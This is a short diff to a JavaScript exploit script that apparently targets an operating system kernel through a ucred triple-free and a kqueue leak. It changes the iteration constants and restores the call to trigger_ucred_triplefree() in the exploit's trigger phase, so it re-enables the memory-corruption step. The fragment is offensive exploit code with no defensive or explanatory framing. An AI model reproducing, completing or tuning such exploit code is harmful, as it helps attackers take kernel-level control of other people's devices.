@@ -117,8 +117,8 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 8;
 var IOV_THREAD_NUM = 4;
 var UIO_THREAD_NUM = 4;
-var MAIN_LOOP_ITERATIONS = 2;
-var TRIPLEFREE_ITERATIONS = 2;
+var MAIN_LOOP_ITERATIONS = 1;
+var TRIPLEFREE_ITERATIONS = 1;
 var MAX_ROUNDS_TWIN = 4;
 var MAX_ROUNDS_TRIPLET = 4;
 var MAIN_CORE = 4;
@@ -939,9 +939,10 @@ function exploit_phase_setup() {
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
-
+  trigger_ucred_triplefree();
   yield_to_render(exploit_phase_leak);
 }
+
 function exploit_phase_leak() {
   var leak_ok = leak_kqueue_safe();
   if (!leak_ok) {
